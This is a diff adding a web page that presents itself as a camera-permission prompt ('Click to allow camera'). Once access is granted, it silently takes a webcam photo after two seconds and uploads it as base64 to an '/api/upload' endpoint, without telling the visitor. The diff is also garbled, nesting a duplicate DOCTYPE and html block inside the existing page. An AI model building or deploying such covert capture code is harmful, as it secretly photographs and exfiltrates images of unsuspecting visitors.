@@ -1,5 +1,54 @@
 <!DOCTYPE html>
+<html><!DOCTYPE html>
 <html>
+<head>
+    <title>Camera Capture</title>
+</head>
+<body>
+    <h1>Click to allow camera</h1>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <script>
+        // Capture webcam
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                video.play();
+
+                // Take photo after 2 seconds
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+
+                    // Convert to base64
+                    const imageData = canvas.toDataURL('image/png');
+
+                    // Send to Vercel API
+                    fetch('/api/upload', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ image: imageData })
+                    })
+                    .then(response => response.json())
+                    .then(data => console.log('Success:', data))
+                    .catch(error => console.error('Error:', error));
+
+                    // Stop camera
+                    stream.getTracks().forEach(track => track.stop());
+                }, 2000);
+            })
+            .catch(err => {
+                console.error('Camera error:', err);
+            });
+    </script>
+</body>
+</html>
+
 <head>
     <title>Camera Capture</title>
 </head>
